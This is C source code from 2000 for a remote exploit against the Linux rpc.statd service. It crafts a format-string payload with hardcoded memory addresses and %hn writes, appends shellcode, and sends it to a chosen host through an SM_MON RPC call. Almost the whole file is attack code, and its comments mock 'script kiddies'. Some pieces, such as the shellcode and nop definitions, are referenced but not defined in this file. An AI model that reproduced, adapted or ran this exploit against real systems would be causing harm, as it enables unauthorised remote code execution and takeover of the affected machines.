/*
 * Slightly dysfunctional rpc.statd exploit
 *  for all the dysfunctional script kiddies out there
 *
 * Author: drow, 07/2000
 *
 * And just for kicks...
 * Greets:
 *  Chris Evans, whose fault all this is
 *  whoever wrote the old solaris statd exploit I ripped the RPC code out of
 *  <james> send out greetz to all the 1337 D3B14N H4X0R2!!!!
 *  and THEM (THEY know who THEY are)
 *
 *
 * This is dedicated to Joel Klecker.  Those who knew him know why.
 *
 */

#include <sys/types.h>
#include <sys/time.h>
#include <stdio.h>
#include <string.h>
#include <netdb.h>
#include <rpc/rpc.h>
#include <rpcsvc/sm_inter.h>
#include <sys/socket.h>

void usage(char *s) {
  printf("Usage: %s host [-nopoke]\n", s);
  exit(0);
}

extern char shell[];

main(int argc, char *argv[]) {
  CLIENT *cl;
  enum clnt_stat stat;
  struct timeval tm;
  struct mon monreq;
  struct sm_stat_res monres;
  struct hostent *hp;
  struct sockaddr_in target;
  int sd, i, noplen=strlen(nop), nopoke=0;
  char *ptr=code, *p2, code[4096];

  if (argc < 2)
    usage(argv[0]);
  if (argc > 2)
    nopoke = 1;

  /* Alignment */
  strcpy(ptr, "AAA");
  ptr += strlen(ptr);
  
  /* Target to write to! */
  *(unsigned long *)(ptr) = 0x7fffeb04;
  ptr += sizeof(unsigned long);
  
  /* pad */
  *(unsigned long *)(ptr) = 0x11111111;
  ptr += sizeof(unsigned long);

  /* Target Two (two higher in memory probably) */
  *(unsigned long *)(ptr) = 0x7fffeb06;
  ptr += sizeof(unsigned long);
  
  for(i = 0; i < 46-1; i++) {
    strcpy(ptr, "%12d");
    ptr += strlen(ptr);
  }

if(!nopoke) {
  /* Value to write - amount written */
  /* Guess a bit - remember to leave a lot of padding, and be lucky on alignment */
  /* Don't correct for IP address!  Forced to localhost by stat code - same length. */
#define HIGH 0x7fff
#define LOW 0xeecc
  sprintf(ptr, "%%%dd%%hn", HIGH - 12*45
  	  - strlen("STAT_FAIL to 127.0.0.1 for SM_MON of AAABBBB1111CCCC"));
  ptr += strlen(ptr);

  sprintf(ptr, "%%%dd%%hn", (LOW - HIGH) % 65536);
  ptr += strlen(ptr);

  /* CODE */
  p2 = shell;
  while(*p2)
    *(ptr++) = *(p2++);
}
  *(ptr++) = 0;

  memset(&monreq, 0, sizeof(monreq));
  monreq.mon_id.my_id.my_name="localhost";
  monreq.mon_id.my_id.my_prog=0;
  monreq.mon_id.my_id.my_vers=0;
  monreq.mon_id.my_id.my_proc=0;
  monreq.mon_id.mon_name= code  /*code*/;

  if ((hp=gethostbyname(argv[1])) == NULL) {
    printf("Can't resolve %s\n", argv[1]);
    exit(0);
  }
  target.sin_family=AF_INET;
  target.sin_addr.s_addr=*(u_long *)hp->h_addr;
  target.sin_port=0;    /* ask portmap */
  sd=RPC_ANYSOCK;

  tm.tv_sec=10;
  tm.tv_usec=0;
  if ((cl=clntudp_create(&target, SM_PROG, SM_VERS, tm, &sd)) == NULL) {
    clnt_pcreateerror("clnt_create");
    exit(0);
  }
  stat=clnt_call(cl, SM_MON, xdr_mon, (char *)&monreq, xdr_sm_stat_res,
                (char *)&monres, tm);
  if (stat != RPC_SUCCESS)
    clnt_perror(cl, "clnt_call");
  else
    printf("stat_res = %d.\n", monres.res_stat);
  clnt_destroy(cl);
}
